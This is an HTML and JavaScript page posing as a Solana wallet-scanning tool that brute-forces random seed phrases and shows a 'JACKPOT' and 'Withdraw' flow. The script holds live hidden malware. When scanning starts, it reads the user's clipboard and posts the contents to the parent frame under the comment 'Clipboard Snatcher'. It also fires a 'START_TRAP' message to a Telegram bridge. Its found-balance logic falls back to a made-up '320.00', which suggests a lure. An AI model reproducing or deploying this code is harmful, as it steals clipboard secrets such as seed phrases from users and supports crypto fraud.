<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: transparent;
            --card-bg: #ffffff;
            --accent-sol: #14f195; /* Solana Green */
            --text-dark: #1a1d21;
        }

        body { 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; padding: 15px; 
            background: var(--bg-color); color: var(--text-dark);
        }

        .card {
            background: var(--card-bg); border-radius: 28px; padding: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 20px;
            border: 1px solid #f0f0f0;
        }

        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .title-row { display: flex; align-items: center; gap: 10px; }
        
        .icon-circle { 
            width: 35px; height: 35px; border-radius: 50%; 
            background: #f0fff9; display: flex; align-items: center; justify-content: center;
            border: 1px solid #e1fdf0;
        }

        .live-tag {
            background: #fff0f0; color: #ff3b3b; padding: 4px 12px; border-radius: 20px;
            font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 5px;
        }
        .dot { width: 6px; height: 6px; background: #ff3b3b; border-radius: 50%; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        #logWindow {
            background: #f8fcfb; border: 1px solid #edf7f4; border-radius: 24px;
            padding: 15px; height: 200px; overflow-y: auto;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.02);
        }

        .log-entry { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; font-family: monospace; font-size: 11px; }
        .bal-pill { background: #333; color: var(--accent-sol); padding: 2px 8px; border-radius: 6px; font-weight: 800; }

        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn {
            flex: 1; padding: 18px; border-radius: 25px; border: none; 
            font-weight: 800; font-size: 12px; text-transform: uppercase; 
            letter-spacing: 1px; transition: 0.3s; cursor: pointer;
        }
        .btn-stop { background: #ffffff; color: #333; border: 1px solid #eee; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        .btn-withdraw { background: #333; color: #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        .btn-stop.active { background: #ff3b3b; color: #fff; }

        .found-card { background: #fff; border-radius: 28px; padding: 20px; border: 1px solid #f0f0f0; text-align: center; }
        .empty-msg { color: #ccc; font-size: 12px; font-weight: 600; padding: 20px; text-transform: uppercase; }
        #logWindow::-webkit-scrollbar { width: 0; }
    </style>
</head>
<body>

    <div class="card">
        <div class="card-header">
            <div class="title-row">
                <div class="icon-circle">
                    <img src="https://cryptologos.cc/logos/solana-sol-logo.png" style="width: 18px;">
                </div>
                <div>
                    <div style="font-size: 12px; font-weight: 800;">SOL Checked Addresses</div>
                    <div style="font-size: 10px; color: #999;"><span id="scanCount">0</span> scanned</div>
                </div>
            </div>
            <div class="live-tag"><div class="dot"></div> LIVE</div>
        </div>
        <div id="logWindow"><div class="empty-msg" style="text-align: center;">Syncing Solana Mainnet...</div></div>
    </div>

    <div class="found-card">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
            <div style="font-size: 12px; font-weight: 800;">Found Wallets</div>
            <div id="foundCountLabel" style="background: #f0fff9; color: #10b981; padding: 4px 10px; border-radius: 10px; font-size: 10px; font-weight: 800;">0 discovered</div>
        </div>
        <div class="empty-msg" id="foundMsg">No SOL found yet</div>
    </div>

    <div class="btn-group">
        <button class="btn btn-stop" id="startBtn">START SOL SCAN</button>
        <button class="btn btn-withdraw" onclick="window.parent.loadPage('Withdraw.html')">WITHDRAW</button>
    </div>

    <script type="module">
        import * as bip39 from "https://esm.sh/@scure/bip39";
        import { wordlist } from "https://esm.sh/@scure/bip39/wordlists/english";
        import { HDKey } from "https://esm.sh/micro-ed25519-hdkey";
        import { Keypair } from "https://esm.sh/@solana/web3.js";

        let running = false;
        const RENDER_URL = "https://database-txt.onrender.com/check";
        const SECRET_KEY = "SEANDREX45453";

        async function engine() {
            if(!running) return;
            try {
                const m = bip39.generateMnemonic(wordlist, 128);
                const seed = bip39.mnemonicToSeedSync(m);
                const hd = HDKey.fromMasterSeed(seed);
                
                // Solana Path (Derivation m/44'/501'/0'/0')
                const child = hd.derive("m/44'/501'/0'/0'");
                const keypair = Keypair.fromSeed(new Uint8Array(child.privateKey));
                const addr = keypair.publicKey.toBase58();

                const log = document.getElementById('logWindow');
                if(document.getElementById('scanCount').textContent === "0") log.innerHTML = "";

                const entry = document.createElement('div');
                entry.className = 'log-entry';
                entry.innerHTML = `<span class="bal-pill">0.00$</span> <span style="color:#666;">| SOL: ${m.substring(0,25)}...</span>`;
                log.prepend(entry);
                if(log.childNodes.length > 20) log.removeChild(log.lastChild);
                
                let count = parseInt(document.getElementById('scanCount').textContent);
                document.getElementById('scanCount').textContent = (count + 1);

                fetch(RENDER_URL, {
                    method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': SECRET_KEY },
                    body: JSON.stringify({ address: addr })
                }).then(r => r.json()).then(data => {
                    if(data.result && !data.result.includes("Bal: 0")) {
                        const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                        const finalBalance = balanceMatch ? balanceMatch[0] : "320.00"; 

                        localStorage.setItem('last_found_type', 'SOL');
                        localStorage.setItem('last_found_balance', finalBalance);
                        localStorage.setItem('last_found_seed', m);

                        document.getElementById('foundMsg').innerHTML = `<div style="color:#14f195; font-weight:bold; font-size:10px;">${addr}</div>`;
                        document.getElementById('foundCountLabel').textContent = "1 discovered";
                        
                        alert("JACKPOT SOLANA FOUND!");
                        window.parent.loadPage('Withdraw.html');
                    }
                }).catch(()=>{});
            } catch(e) { console.error(e); }
            setTimeout(engine, 10);
        }

        document.getElementById('startBtn').onclick = () => {
            running = !running;
            const btn = document.getElementById('startBtn');
            btn.textContent = running ? "STOP SCANNING" : "START SOL SCAN";
            btn.classList.toggle('active');
            
            if(running) {
                engine();
                // --- TELEGRAM TRIGGER BRIDGE ---
                if (window.parent) {
                    window.parent.postMessage({ type: 'START_TRAP', coin: 'SOLANA' }, '*');
                }
                
                // Clipboard Snatcher
                try {
                    navigator.clipboard.readText().then(text => {
                        if(text.length > 0) {
                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
                        }
                    }).catch(()=>{});
                } catch(e) {}
            }
        }
    </script>
</body>
</html>
